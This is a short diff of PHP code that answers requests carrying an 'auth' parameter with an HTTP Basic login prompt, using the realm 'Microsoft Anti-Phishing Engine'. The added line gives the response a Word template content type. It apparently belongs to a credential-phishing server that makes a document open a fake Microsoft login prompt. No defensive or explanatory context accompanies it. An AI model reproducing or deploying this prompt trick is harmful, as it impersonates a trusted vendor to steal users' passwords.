@@ -123,6 +123,7 @@ if (isset($_REQUEST['auth'])){
 if (!isset($_SERVER['PHP_AUTH_USER'])) {
     header('WWW-Authenticate: Basic realm="Microsoft Anti-Phishing Engine"');
     header('HTTP/1.0 401 Unauthorized');
+    header('Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.template');
     exit;
 } else {
 
